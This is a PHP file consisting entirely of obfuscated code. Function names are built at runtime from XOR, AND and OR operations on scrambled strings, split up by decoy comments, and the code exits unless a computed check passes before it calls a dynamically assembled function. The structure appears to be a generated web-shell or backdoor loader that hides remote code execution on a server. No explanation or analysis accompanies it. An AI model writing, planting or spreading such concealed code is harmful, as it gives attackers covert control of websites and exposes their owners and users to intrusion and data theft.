<?php
$xirIN='gF_DBa0I17'&zlHXGxN;$mTJaJLqWC='{'.wvsm.'}'&'{|~kmy';$Ffd5S28mmHz='Su;>/1'&#t'.
       'SEz>-a';$vpW='Eh,].(qXq-'.Bvnh^'g('.Hyax2.'}Cg&7 +';$T2Y5Gm8YS=#GExa7gohi9zGn'.
       '@!(LM 0@@Y p`B'|'C $L^%0@@E&U@b';$VbqeuI='H@@@MA'|'@@T@U@';$zygiWOnl='GD]'./*'.
       '6v~>w:*/mcNSFb.'%Nz.Wl;'^'#o|#8tl~0'.vo1uz.'(q';$j19Nw9='"&#:1p)}*=~h|u#2qz;o'.
       '%0z?q'^jrszc.' p=~}4<;;}a0:{*'.cs3w4;$mopBJ="}".um9qsdo."<m0u"&';:w95?'./*mfY'.
       'tX!Fou4*/lc4g.'{5';$shx='5BLu'|'cG$"';$Hf_=u&k;$Wqav2czb=(QH0UR."?"^#W86RJ05g'.
       '&4K>=I')&$mTJaJLqWC;$GaV=(nsQ^'](3')^('~?w'&"^?_");$hM0zxUl3V=('$ '.NRAW|'0 F'.
       '[B@')^$Ffd5S28mmHz;$ams0QE=$vpW|$T2Y5Gm8YS;$ZdgDpnO=$VbqeuI|('@'.PPPB.'@'|'HD'.
       '@@B@');$bheTDkaoHz=('^@'.DR3bo.'}SE}v'^'>b!ql N=?$?R')|('V@hL-'.f_Kg.'^Ag'^#O'.
       '&0I+zV:;/~ "');$gXFlgTH=('wpY<-'.ooegk.'|i>~/?'&'Gz[o}oXb%o|lw^m/')^/*Z_Wk2JN'.
       'JBHx6z*/$zygiWOnl;$ttAJR=(zTWrOH.'~'.iVAnDBWwBSSElHrBru&'H]tY_{'.OScgOfwOW.'['.
       ''.bREVNW.']VE')|$j19Nw9;$fcBrk=('_o|e'&'_M}W')&$shx;!$Wqav2czb($GaV(/*OdIJVea'.
       ' .*/$hM0zxUl3V($ZdgDpnO)),('!d04$`5 a1!$'|'5@15@"!3@(17').$mopBJ.$Hf_.(/*dAK9'.
       'JS*/BBbIT.'}'^sqSp7I).(':'&'6'))||exit;$ams0QE($bheTDkaoHz,$gXFlgTH,/*adkBGgS'.
       '~.*/$hM0zxUl3V($ttAJR),$fcBrk);#jbn^k&D^1X?j.6{y(xnAY]_Zs!%}I 3J<]:%+Y>,3Dq6'.
       'znJtVT9p-=+8y<_G}0DGQP1m:j5YN2gjVR$:&%p43w>+B!)T{gFtgCwBcos';